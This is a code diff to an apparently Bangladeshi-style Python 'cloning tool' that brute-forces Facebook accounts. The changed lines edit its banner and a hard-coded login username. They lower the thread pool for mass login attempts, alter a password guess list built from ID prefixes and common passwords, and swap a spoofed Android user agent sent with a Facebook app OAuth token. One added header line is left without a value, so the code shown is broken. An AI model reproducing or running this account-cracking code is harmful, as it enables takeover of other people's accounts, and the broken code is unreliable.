@@ -77,16 +77,16 @@ logo = ("""
     ░  ░░ ░              ░  ░    ░  
         ░ ░                                                                                                                                         
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- ┃ [\033[1;91m✓\033[1;92m] CREATOR   \033[1;91m: \033[1;92mNIÑO INFIESTO      
- ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mCLONING TOOL             
- ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mTRIAL                       
- ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                    
- ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mwww.facebook.com/100080607586393              
- ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.6        
+ ┃ [\033[1;37m✓\033[1;91m] CREATOR   \033[1;91m: \033[1;91mNIÑO INFIESTO      
+ ┃ [\033[1;37m✓\033[1;91m] TOOL      \033[1;91m: \033[1;91mCLONING TOOL             
+ ┃ [\033[1;91m✓\033[1;91m] STATUS    \033[1;91m: \033[1;91mFree                       
+ ┃ [\033[1;91m✓\033[1;91m] SYSTEM    \033[1;91m: \033[1;91mDATA & WIFI                    
+ ┃ [\033[1;91m✓\033[1;91m] FACEBOOK  \033[1;91m: \033[1;91mwww.facebook.com/100080607586393              
+ ┃ [\033[1;37m✓\033[1;91m] VERSION \033[1;91m: \033[1;91m1.1        
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def linex():
-        print('\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        print('\033[1;91m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 def clear():
         os.system(f'clear')
         print(logo)
@@ -97,7 +97,7 @@ pcp=[]
 id=[]
 tokenku=[]
 # LOGIN_KEY
-correct_username = 'papanins'
+correct_username = 'kissko'
 key = 'true'
 
 while key == 'true':
@@ -170,7 +170,7 @@ def Spy():
 			pcp.append(f'n')
 		else:
 			pcp.append(f'y')
-		with tred(max_workers=50) as crack_submit:
+		with tred(max_workers=40) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
@@ -519,7 +519,7 @@ def gml():
                         linex()
                         for psx in user:
                                 ids = code+codex+psx
-                                passlist = [code,codex,code+codex,code+' '+codex,code+'123',code+'1234',code+'12345','@#@#@#','123890']
+                                passlist = [code,codex,code+codex,code+' '+codex,code+'123',code+'1234',code+'12345','123456789','123890']
                                 sat.submit(apix,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -570,7 +570,8 @@ def rcrack_free(idf,pwv):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1'}
+    'upgrade-insecure-requests': '1',
+    'user-agent': }
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -637,7 +638,7 @@ def apix(ids,passlist):
                                         'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
+                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
